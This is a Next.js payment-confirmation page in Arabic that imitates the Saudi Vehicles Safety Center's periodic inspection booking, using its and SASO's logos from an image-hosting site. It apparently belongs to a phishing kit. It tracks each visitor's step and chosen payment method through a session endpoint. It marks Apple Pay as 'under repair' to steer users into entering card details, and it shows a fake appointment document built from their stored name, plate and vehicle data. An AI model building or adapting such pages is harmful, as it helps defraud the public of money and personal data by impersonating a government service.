"use client";
export const dynamic = 'force-dynamic';
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";
const LIGHT_GREEN = "#f0f9f4";

export default function ConfirmPage() {
  const router = useRouter();
  const [booking, setBooking] = useState<Record<string, string>>({});
  const [paymentMethod, setPaymentMethod] = useState("credit_card");
  const [showModal, setShowModal] = useState(false);

  useEffect(() => {
    const data = localStorage.getItem("vsc_booking");
    if (data) setBooking(JSON.parse(data));
  }, []);

  const cardStyle: React.CSSProperties = {
    border: "1px solid #e0e0e0", borderRadius: "12px", padding: "20px",
    marginBottom: "20px", boxShadow: "0 2px 5px rgba(0,0,0,0.03)", background: "#fff"
  };

  const infoRow: React.CSSProperties = {
    display: "flex", justifyContent: "space-between",
    padding: "12px 0", borderBottom: "1px solid #f5f5f5", fontSize: "14px"
  };

  const cardHeaderStyle: React.CSSProperties = {
    display: "flex", alignItems: "center", fontWeight: "bold",
    fontSize: "16px", marginBottom: "20px", color: "#333", gap: "10px"
  };

  function handlePayment() {
    fetch('/api/session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ current_page: 'confirm', payment_method: paymentMethod }),
    }).catch(() => {});
    router.push("/payment");
  }

  return (
    <div style={{ backgroundColor: "#fff", minHeight: "100vh", fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", color: "#333" }} dir="rtl">
      <SessionTracker page="confirm" />

      {/* Header */}
      <img src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg" alt="Header" style={{ width: "100%", display: "block" }} />

      <div style={{ padding: "15px", maxWidth: "500px", margin: "0 auto" }}>
        <h1 style={{ textAlign: "center", color: GREEN, fontSize: "20px", fontWeight: "bold", margin: "20px 0 5px" }}>
          خدمة الفحص الفني الدوري
        </h1>
        <p style={{ textAlign: "center", color: "#777", fontSize: "18px", marginBottom: "25px" }}>
          ملخص الطلب والدفع
        </p>

        {/* تفاصيل الخدمة */}
        <div style={cardStyle}>
          <div style={cardHeaderStyle}>
            <svg width="20" height="20" fill={GREEN} viewBox="0 0 24 24">
              <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
            </svg>
            تفاصيل الخدمة
          </div>
          <div style={infoRow}>
            <span style={{ color: "#888" }}>اسم الخدمة</span>
            <span style={{ fontWeight: "500" }}>خدمة الفحص الفني الدوري</span>
          </div>
          <div style={infoRow}>
            <span style={{ color: "#888" }}>رسوم الخدمة</span>
            <span style={{ fontWeight: "500" }}>100 ر.س</span>
          </div>
          <div style={{ ...infoRow, borderBottom: "none" }}>
            <span style={{ color: "#888" }}>ضريبة القيمة المضافة (15%)</span>
            <span style={{ fontWeight: "500" }}>15 ر.س</span>
          </div>
          <div style={{ backgroundColor: LIGHT_GREEN, display: "flex", justifyContent: "space-between", padding: "15px", borderRadius: "8px", marginTop: "10px", color: GREEN, fontWeight: "bold", fontSize: "18px" }}>
            <span>المجموع الكلي</span>
            <span>115 ر.س</span>
          </div>
          <button
            onClick={() => setShowModal(true)}
            style={{ display: "flex", alignItems: "center", justifyContent: "center", width: "100%", padding: "12px", backgroundColor: GREEN, color: "white", border: "none", borderRadius: "8px", fontSize: "16px", marginTop: "15px", cursor: "pointer" }}
          >
            معاينة وثيقة الموعد
          </button>
        </div>

        {/* طريقة الدفع */}
        <div style={cardStyle}>
          <div style={cardHeaderStyle}>
            <svg width="20" height="20" fill={GREEN} viewBox="0 0 24 24">
              <path d="M20,8H4V6H20M20,18H4V12H20M20,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4Z"/>
            </svg>
            طريقة الدفع
          </div>

          {/* بطاقة ائتمان */}
          <div
            onClick={() => setPaymentMethod("credit_card")}
            style={{
              border: paymentMethod === "credit_card" ? "2px solid #2ecc71" : "1px solid #e0e0e0",
              borderRadius: "10px", padding: "15px", marginBottom: "15px",
              display: "flex", alignItems: "center", justifyContent: "space-between",
              cursor: "pointer", backgroundColor: paymentMethod === "credit_card" ? "#fafffa" : "#fff"
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "15px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" style={{ width: "40px", height: "auto" }} />
                <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard" style={{ width: "40px", height: "auto" }} />
              </div>
              <div>
                <div style={{ fontWeight: "bold", fontSize: "14px" }}>بطاقة ائتمان</div>
                <div style={{ fontSize: "12px", color: "#888" }}>Visa, Mastercard</div>
              </div>
            </div>
            <div style={{ width: "20px", height: "20px", border: `2px solid ${paymentMethod === "credit_card" ? "#2ecc71" : "#ddd"}`, borderRadius: "50%", position: "relative", flexShrink: 0 }}>
              {paymentMethod === "credit_card" && (
                <div style={{ width: "10px", height: "10px", background: "#2ecc71", borderRadius: "50%", position: "absolute", top: "50%", left: "50%", transform: "translate(-50%, -50%)" }} />
              )}
            </div>
          </div>

          {/* Apple Pay */}
          <div
            onClick={() => setPaymentMethod("apple")}
            style={{
              border: paymentMethod === "apple" ? "2px solid #2ecc71" : "1px solid #e0e0e0",
              borderRadius: "10px", padding: "15px", marginBottom: "5px",
              display: "flex", alignItems: "center", justifyContent: "space-between",
              cursor: "pointer", backgroundColor: paymentMethod === "apple" ? "#fafffa" : "#fff"
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: "15px" }}>
              <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" style={{ width: "50px", height: "auto" }} />
              <div>
                <div style={{ fontWeight: "bold", fontSize: "14px" }}>Apple Pay</div>
                {paymentMethod === "apple" && (
                  <div style={{ color: "#d93025", fontSize: "12px", marginTop: "4px", fontWeight: "bold" }}>هذه الخدمه غير متاحة الان جاري الاصلاح</div>
                )}
              </div>
            </div>
            <div style={{ width: "20px", height: "20px", border: `2px solid ${paymentMethod === "apple" ? "#2ecc71" : "#ddd"}`, borderRadius: "50%", position: "relative", flexShrink: 0 }}>
              {paymentMethod === "apple" && (
                <div style={{ width: "10px", height: "10px", background: "#2ecc71", borderRadius: "50%", position: "absolute", top: "50%", left: "50%", transform: "translate(-50%, -50%)" }} />
              )}
            </div>
          </div>
        </div>

        {/* ملخص الطلب */}
        <div style={cardStyle}>
          <div style={{ color: GREEN, fontWeight: "bold", marginBottom: "15px", fontSize: "16px" }}>ملخص الطلب</div>
          <div style={infoRow}>
            <span style={{ color: "#888" }}>الخدمة</span>
            <span style={{ fontWeight: "500" }}>خدمة الفحص الفني الدوري</span>
          </div>
          <div style={infoRow}>
            <span style={{ color: "#888" }}>الرسوم</span>
            <span style={{ fontWeight: "500" }}>100 ر.س</span>
          </div>
          <div style={{ ...infoRow, borderBottom: "none" }}>
            <span style={{ color: "#888" }}>الضريبة</span>
            <span style={{ fontWeight: "500" }}>15 ر.س</span>
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", padding: "15px 0", borderTop: "1px solid #eee", marginTop: "10px" }}>
            <span style={{ fontWeight: "bold", fontSize: "18px" }}>المجموع</span>
            <span style={{ fontWeight: "bold", fontSize: "18px", color: GREEN }}>115 ر.س</span>
          </div>
          <button
            onClick={handlePayment}
            style={{ backgroundColor: "#58c48d", color: "white", width: "100%", padding: "15px", border: "none", borderRadius: "8px", fontSize: "17px", fontWeight: "bold", display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", cursor: "pointer", marginTop: "10px" }}
          >
            متابعة الدفع
          </button>
          <div style={{ textAlign: "center", fontSize: "12px", color: "#999", marginTop: "15px", lineHeight: "1.6", marginBottom: "10px" }}>
            بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
          </div>
        </div>
      </div>

      {/* Footer */}
      <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" alt="Footer Top" style={{ width: "100%", display: "block" }} />
      <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" alt="Footer Bottom" style={{ width: "100%", display: "block" }} />

      {/* Modal - وثيقة الموعد */}
      {showModal && (
        <div
          style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", background: "rgba(0,0,0,0.7)", zIndex: 2000, display: "flex", justifyContent: "center", alignItems: "center" }}
          onClick={() => setShowModal(false)}
        >
          <div
            style={{ background: "white", width: "92%", maxWidth: "400px", borderRadius: "12px", padding: 0, overflow: "hidden", position: "relative" }}
            onClick={e => e.stopPropagation()}
          >
            <div
              onClick={() => setShowModal(false)}
              style={{ position: "absolute", top: "10px", left: "10px", fontSize: "20px", cursor: "pointer", color: "#999", zIndex: 10 }}
            >✕</div>
            <div style={{ padding: "20px" }}>
              {/* Header الوثيقة */}
              <div style={{ position: "relative", textAlign: "center", marginBottom: "20px", paddingTop: "10px" }}>
                <img src="https://i.ibb.co/7JPt9dQG/saso-logo.png" alt="SASO" style={{ position: "absolute", top: 0, right: 0, width: "85px" }} />
                <img src="https://i.ibb.co/8g6zZ3hm/vsc-logo-icon-1.png" alt="VSC" style={{ width: "75px", marginBottom: "10px" }} />
                <div style={{ color: GREEN, fontSize: "16px", fontWeight: "bold", marginBottom: "3px" }}>مركز سلامة المركبات</div>
                <div style={{ color: "#666", fontSize: "14px", marginBottom: "15px" }}>Vehicles Safety Center</div>
              </div>
              <div style={{ textAlign: "center", fontSize: "16px", fontWeight: "bold", color: GREEN, borderBottom: `2px solid ${GREEN}`, display: "inline-block", marginBottom: "20px", paddingBottom: "5px", width: "100%" }}>
                وثيقة موعد الفحص الفني الدوري
              </div>
              <table style={{ width: "100%", borderCollapse: "collapse" }}>
                {[
                  ["الاسم", booking.fullName || "-"],
                  ["نوع المركبة", booking.vType || "-"],
                  ["رقم المركبة", booking.plate || "-"],
                  ["المنطقة", booking.region || "-"],
                  ["مركز الفحص", booking.center || "-"],
                  ["تاريخ الفحص", booking.fDate || "-"],
                  ["وقت الفحص", booking.fTime || "-"],
                ].map(([label, value], i) => (
                  <tr key={i}>
                    <td style={{ padding: "12px 0", borderBottom: "1px solid #eee", fontSize: "14px", color: "#888" }}>{label}</td>
                    <td style={{ padding: "12px 0", borderBottom: "1px solid #eee", fontSize: "14px", textAlign: "left", fontWeight: "bold", color: "#333" }}>{value}</td>
                  </tr>
                ))}
              </table>
              <div style={{ backgroundColor: "#fff5f5", color: "#d93025", padding: "12px", borderRadius: "8px", textAlign: "center", fontWeight: "bold", fontSize: "13px", marginTop: "20px" }}>
                حالة الموعد: بحاجة الى تأكيد الدفع ومتابعة الاجراءات
              </div>
              <button
                onClick={() => setShowModal(false)}
                style={{ backgroundColor: "white", border: `1px solid ${GREEN}`, color: GREEN, width: "100%", padding: "12px", borderRadius: "8px", marginTop: "15px", fontWeight: "bold", cursor: "pointer", fontSize: "14px" }}
              >
                مركز سلامة المركبات
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
